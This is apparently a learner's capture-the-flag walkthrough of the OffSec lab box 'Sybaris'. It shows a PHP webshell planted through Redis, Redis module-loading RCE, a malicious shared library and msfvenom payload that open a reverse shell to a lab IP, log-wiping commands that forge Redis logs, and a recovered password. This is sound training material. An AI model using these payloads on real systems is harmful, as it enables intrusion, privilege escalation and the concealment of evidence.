# Sybaris Helped Through

Name: Sybaris
Date:  
Difficulty: Medium
Goals:  
TJNULL box a day till I am iron out every tiny imperfection in my thinking
Learnt:
- Recent box was similar issue- its not rabbitholing CTFs its just OFFSEC being these are actually pieces 
- When some exploit does not work **factor** in the services available to the box  
- The nasty psychological affect of when expect something to work and have confidently executed to then find it not work. 
- All the 4/5 redis exploits and the contextual clues 
- Contextual Awareness +1
Beyond Root:

- [[Sybaris-Notes.md]]
- [[Sybaris-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS and I normally do a `ping` to confirm the hops and start guessing on the OS as you would not know until you fingerprint the box somehow what OS it is.. never mind.

This a key piece to vulnerability that I need, but made the erroneous call that it was either for a webshell and had not factored it in
![](nmapftpanon.png)

Confirming we can upload to the FTP server as anonymous passwordless user
![](ftpwritablepubdir.png)
What I should have keep in mind is we can execute from this directory. I instead search engine-dorked whether you could execute binaries with the FTP client as I have never done that.   

Nmap reads the `robots.txt`
![](robotsandredis.png)

The composer.json is informational disclosure vulnerability that provides information about the stack that does not need to be exposed.
![](composerjson.png)

There is a `redis` database on the port 6379
![](redisisvuln.png)

Checking if  `/pub` from the FTP server is under `/var/www/html` - it is not meaning the webshell from vulnerablit(y|ies) of the web application are unlikely. 
![](gobuster301s.png)

This is a false positive I checked as it would be then be convenient to path traversal, but it is false positive sadly. 
![](phppathtrav.png)
## Exploiting unsuccessfully

Given the version of redis has some critical vulnerabilities I have actually exploited before.[Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)](https://www.exploit-db.com/exploits/47195) and the non-metasploit varient [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  I used from [[Reddish-Helped-Through]]
```bash
# 0xDF 
# cmd.php:




 <? system($_REQUEST['cmd']); ?>




# redishRCE.sh
#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 192.168.231.93 flushall
cat cmd.php | redis-cli -h 192.168.231.93 -x set subscribetoippsecandread0xdf
redis-cli -h 192.168.231.93 config set dir /tmp
redis-cli -h 192.168.231.93 config set dbfilename "cmd.php"
redis-cli -h 192.168.231.93 save
```
We can upload files  
![](redisRCEsh.png)
I then learnt of a nasty psychological affect of when expect something to work and have confidently executed to then find it not work. In my doubt I wasted a 5 minute-ish interval [on this exploit that is not relevant because of said affect.](https://www.exploit-db.com/exploits/1244 )

Found a directory - probably `redis` is running as a `redis` user  
	- /tmp works! 

I then started considering whether I had missed something with the web CMS - htmly - [[metatag-cms-http___192.168.237.93_]]. This teased me with arbitrary file .., but  https://nvd.nist.gov/vuln/detail/CVE-2020-23766 - is an arbitrary file deletion vulnerability was discovered on htmly v2.7.5 which allows remote attackers to use any absolute path to delete any file in the server should they gain Administrator privileges.
![](mehhtlmy.png)

I tried unsuccessfully to exploit with this exploit:
```bash
cd redis-rce
python3 -m venv .venv;
source .venv/bin/activate;
pip3 install -r requirements.txt;
python3 redis-rce.py
```

I sort of worked the first time, but I tried to re-exploit this after resetting and it just failed over and over again..
![](tryingwithtmetasploitexpsofile.png)
Then with https://github.com/n0b0dyCN/RedisModules-ExecuteCommand and failed as there was no `#include <string.h>` 

Added `#include <string.h>` and it still timed out.. *I am confusion*
## Foothold

At this point I think my main problem in retrospect was I was invested in exploiting a way I knew worked rather than being focused on the how or variations that were not already tried by others. 

The issue with this machine I had was I was not thinking generally - `redis 4/5` is vulnerable for a number of reasons. I should have in this situation list out exactly what could be possible with this version and compare to what we can by the context of the rest of this machine. I thought it was a read and write vulnerability - in fact there is this one circumstance were we can load modules which I could not have technically done the previous way as we would need to stream raw binary or encode - decode in some way. It is also a big remind of actual context and not situation-to-situation familiarity.  

I click the big get Walk though button, but learnt a lot about myself in a situation I am not usual find myself in.

Write up a hoy because the time constraints must be harsh
```
make -C ./src
```

We need to upload a module.so that can be then loaded by the database
![](wu-ftpuploadmoduleso.png)

`LOAD MODULE` we load and then the database will execute the module, because it trusts it is a module for `redis` if does not work then the error handling will kick.   
```bash
redis-cli -h $ip
MODULE LOAD /path/to/module/module.so
```


![](wu-loadmodule.png)

![](wu-revshell.png)

## Privilege Escalation

Now to PrivEsc myself starting with user
```
find . -type f -name "*.*onf*" 2>/dev/null | xargs grep -ie 'passw'
```
![](wpawifilessconf.png)

goodness=gracious default password me 
![](iniparse.png)

Interesting files of a User
```
find / -user $USER -ls 2>/dev/null | grep -v '/run/\|/proc/\|/sys/'
```
![](pabloisfilepoor.png)

Reading the logs 
![1080](badopsec.png)

Log cleaning and sneakiness
```bash
echo "" > /var/log/redis/redis-server.log 
echo "1937:C 02 Nov 2023 16:35:22.932 # Redis version=5.0.9, bits=64, commit=00000000, modified=0, pid=1937, just started" > /var/log/redis/redis-server.log
echo "1937:C 02 Nov 2023 16:35:22.932 # Configuration loaded" | tee -a /var/log/redis/redis-server.log
```

Questions
![](wtfissuexec.png)

And more questions
![](python2asroot.png)

Pablo's password
![](pablospassword.png)

```
admin : PostureAlienateArson345
```

And an nice ssh shell
![](ssh.png)

The config.ini contains the plugin and implies use. And more questions answered
![](foundthepluginthatbugged.png)

pablo has no sudo privileges
![](pablonosudo.png)

This is probably left as a template by application 
![](weirdmysqlcnf.png)

And more questions - retrospective 
![](weirdport25onlocalhost.png)

Linpeas highlights the vulnerable path:
![](libdevdir.png)

Peaking at the Writeup as prompt for time. The cronjob is the way forward.
[LD_LIBARARY_PATH article](https://www.hpc.dtu.dk/?page_id=1180) : *`LD_LIBRARY_PATH` tells the dynamic link loader (ld. so – this little program that starts all your applications) where to search for the dynamic shared libraries an application was linked against.*

This basically the Linux equivalent of DLL Hijacking. Sad tiny red fedora hats m'LD all round when you can replicate a Windows Vulnerability on Linux. 
![](notarealmanpage.png)


This is [baeldung - show-shared-libraries-executables](https://www.baeldung.com/linux/show-shared-libraries-executables)
![1080](ldenum.png)

Analysing `$file.so` 
```bash
# ldd
ldd $FILE
# objdump
objdump -p $FILE | grep 'NEEDED'
# readelf
readelf --dynamic $FILE | grep NEEDED

# find the pid and checking /proc maps file
pgrep $target
cat /proc/$PID/maps 
awk '$NF!~/\.so/{next} {$0=$NF} !a[$0]++' /proc/$PID/maps 
```

![](noutils.png)

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/bash -i >& /dev/tcp/192.168.45.225/6379 0>&1",NULL,NULL);
}
```

We wont get the shell - my c reading is still on point and brain is actually working
https://man7.org/linux/man-pages/man3/system.3.html
```
//gcc -shared -o utils.so -fPIC utils.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/bash -i >& /dev/tcp/192.168.45.225/6379 0>&1",NULL,NULL);
}
```

I waited but then decided to make this test as a learning extension in beyond root to write some C code and understand what `make` actually does and is it worth using. I heard it was bad for some reason I can not remember - possibly for it being an additional file to not trust on your system and it is someone else's compiler flags preferences.
![](sadness.png)
I also changed it to `sh` for the reverse shell above, I tried `/dev/shm/shell.sh` that pointed just, but that filed. 

Having almost not used `msfvenom` since I realised that it is signatured into the ground on windows systems and then you need to transfer the binary - AND there is the its another OFFSEC machine where use the PIECES they aren't all rabbit holes 
```bash
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
```

And root!
![](root.png)
## Post-Root-Reflection  

.so libraries the machine has reinforced my need to think about how to correctly contextualise CTFy pieces. As previously stated *The issue with this machine I had was I was not thinking generally - `redis 4/5` is vulnerable for a number of reasons. I should have in this situation list out exactly what could be possible with this version and compare to what we can by the context of the rest of this machine. I thought it was a read and write vulnerability - in fact there is this one circumstance were we can load modules which I could not have technically done the previous way as we would need to stream raw binary or encode - decode in some way. It is also a big remind of actual context and not situation-to-situation familiarity.*

I am confident I can piece together Linux Privilege Escalations pretty effectively, but forcing myself to question and create general mapping of a context of the machine to avoid this situation in the future.
## Beyond Root

Understanding `make` - why does ` system("/bin/bash -i >& /dev/tcp/192.168.45.225/6379 0>&1",NULL,NULL);` not work. Twinned with [[XposedAPI-Writeup]]
```
make -C ./src
```

How to avoid the situation prioritising focusing on contextual awareness over the tried and tested methods or historical?